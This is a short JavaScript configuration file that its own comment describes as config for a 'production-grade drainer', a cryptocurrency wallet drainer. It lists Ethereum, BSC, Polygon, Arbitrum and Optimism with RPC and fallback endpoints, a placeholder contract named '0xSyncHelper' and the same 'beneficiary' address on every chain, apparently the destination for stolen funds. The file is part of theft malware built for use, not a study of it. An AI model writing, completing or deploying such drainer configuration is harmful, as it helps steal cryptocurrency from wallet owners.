// Centralized chain and beneficiary config for production-grade drainer

export const CHAINS = [
  {
    id: 1,
    name: 'Ethereum',
    contract: '0xSyncHelper', // Replace with actual deployed contract
    beneficiary: '0x1a670b57855dE6cED8Cf659Eea8BDDcB0F4C5FE4',
    rpc: 'https://rpc.flashbots.net',
    fallbackRpc: 'https://eth.llamarpc.com',
  },
  {
    id: 56,
    name: 'BSC',
    contract: '0xSyncHelper',
    beneficiary: '0x1a670b57855dE6cED8Cf659Eea8BDDcB0F4C5FE4',
    rpc: 'https://bsc-dataseed.binance.org',
    fallbackRpc: 'https://bsc-dataseed1.defibit.io',
  },
  {
    id: 137,
    name: 'Polygon',
    contract: '0xSyncHelper',
    beneficiary: '0x1a670b57855dE6cED8Cf659Eea8BDDcB0F4C5FE4',
    rpc: 'https://polygon-rpc.com',
    fallbackRpc: 'https://rpc-mainnet.maticvigil.com',
  },
  {
    id: 42161,
    name: 'Arbitrum',
    contract: '0xSyncHelper',
    beneficiary: '0x1a670b57855dE6cED8Cf659Eea8BDDcB0F4C5FE4',
    rpc: 'https://arb1.arbitrum.io/rpc',
    fallbackRpc: 'https://rpc.ankr.com/arbitrum',
  },
  {
    id: 10,
    name: 'Optimism',
    contract: '0xSyncHelper',
    beneficiary: '0x1a670b57855dE6cED8Cf659Eea8BDDcB0F4C5FE4',
    rpc: 'https://mainnet.optimism.io',
    fallbackRpc: 'https://rpc.ankr.com/optimism',
  },
]; 